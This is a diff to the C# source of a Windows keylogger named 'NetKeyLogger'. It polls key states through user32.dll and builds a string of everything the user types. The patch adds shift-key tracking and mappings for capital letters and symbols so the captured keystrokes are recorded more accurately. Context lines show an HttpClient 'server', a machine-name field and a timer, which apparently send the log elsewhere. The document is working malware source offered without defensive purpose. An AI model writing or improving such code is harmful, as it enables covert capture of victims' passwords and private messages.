@@ -1,4 +1,5 @@
 using System.Runtime.InteropServices;
+using static System.Runtime.CompilerServices.RuntimeHelpers;
 
 namespace NetKeyLogger
 {
@@ -10,6 +11,8 @@ namespace NetKeyLogger
         static private KeyValuePair<string, string> machineNameFormData;
         static private HttpClient server = new HttpClient();
         static private string str;
+
+        static bool shiftKeyPressed;
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -37,7 +40,7 @@ namespace NetKeyLogger
             { 8, "" },
             { 9, "[TAB]" },
             { 13, "[ENTER]" },
-            { 16, "[SHIFT]" },
+            { 16, "" },
             { 17, "" },
             { 19, "[PAUSE]" },
             { 20, "[CAPS LOCK]" },
@@ -127,11 +130,74 @@ namespace NetKeyLogger
             { 163, "[Ctrl]" },
             { 164, "[Alt]" },
             { 165, "[Alt]" },
+            { 186, ";"},
+            { 187, "="},
             { 188, "," },
             { 189, "-" },
             { 190, "." },
+            { 191, "/"},
+            { 219, "["},
+            { 220, "\\"},
+            { 221, "]"},
             { 222, "'" },
-            { 226, "\\" }
+            { 226, "\\" },
+            { 332, " " },
+            { 348, ")" },
+            { 349, "!" },
+            { 350, "@" },
+            { 351, "#" },
+            { 352, "$" },
+            { 353, "%" },
+            { 354, "^" },
+            { 355, "&" },
+            { 356, "*" },
+            { 357, "(" },
+            { 365, "A" },
+            { 366, "B" },
+            { 367, "C" },
+            { 368, "D" },
+            { 369, "E" },
+            { 370, "F" },
+            { 371, "G" },
+            { 372, "H" },
+            { 373, "I" },
+            { 374, "J" },
+            { 375, "K" },
+            { 376, "L" },
+            { 377, "M" },
+            { 378, "N" },
+            { 379, "O" },
+            { 380, "P" },
+            { 381, "Q" },
+            { 382, "R" },
+            { 383, "S" },
+            { 384, "T" },
+            { 385, "U" },
+            { 386, "V" },
+            { 387, "W" },
+            { 388, "X" },
+            { 389, "Y" },
+            { 390, "Z" },
+            { 396, ")" },
+            { 397, "!" },
+            { 398, "@" },
+            { 399, "#" },
+            { 400, "$" },
+            { 401, "%" },
+            { 402, "^" },
+            { 403, "&" },
+            { 404, "*" },
+            { 405, "(" },
+            { 486, ":"},
+            { 487, "+"},
+            { 488, "<" },
+            { 489, "_" },
+            { 490, ">" },
+            { 491, "?"},
+            { 519, "{"},
+            { 520, "|"},
+            { 521, "}"},
+            { 522, "\"" }
         };
             Timer timer = new Timer(TimerCallback, null, TimeSpan.FromSeconds(5), TimeSpan.FromSeconds(5));
             while (true)
@@ -140,7 +206,48 @@ namespace NetKeyLogger
                 {
                     if (GetAsyncKeyState(i) == 32769)
                     {
-                        str += myDictionary[i];
+                        if (i==160 || i==16)
+                        {
+                            shiftKeyPressed = true;
+                        }
+                        else if(shiftKeyPressed==true)
+                        {
+
+                             if (myDictionary.ContainsKey(i+300))
+                             {
+                                    str += myDictionary[i + 300];
+                             }
+                             else
+                             {
+                                    str += myDictionary[i];
+                             }
+                        }
+                        else
+                        {
+                            str += myDictionary[i];
+                        }
+                        if ((GetAsyncKeyState(160) & 0x8000) == 0)
+                        {
+                            shiftKeyPressed = false;
+                            if (str.Length > 1)
+                            {
+                                int nr=0;
+                                char c = str[str.Length - 1];
+                                string ccomp = ""+str[str.Length - 1];
+                                foreach(var pair in myDictionary)
+                                {
+                                    if(pair.Value==ccomp)
+                                    {
+                                        nr = pair.Key;
+                                    }
+                                }
+                                if(nr>300)
+                                {
+                                    c = myDictionary[nr - 300][0];
+                                }
+                                str = str.Substring(0, str.Length - 1) + c;
+                            }
+                        }
                     }
 
                 }
